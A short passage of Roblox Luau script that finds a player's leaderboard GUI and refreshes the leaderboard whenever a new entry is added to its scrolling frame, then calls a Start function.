            end
        end
        
        local leaderboardGui = plr.PlayerGui:FindFirstChild("LeaderboardGui")
        if leaderboardGui then
            local mainFrame = leaderboardGui:FindFirstChild("MainFrame")
            if mainFrame then
                local frm = mainFrame:FindFirstChild("ScrollingFrame")
                if frm then
                    frm.ChildAdded:Connect(function()
                        task.wait(0.1)
                        RefreshLeaderboard()
                    end)
                end
            end
        end
    end
    
    Start()
end
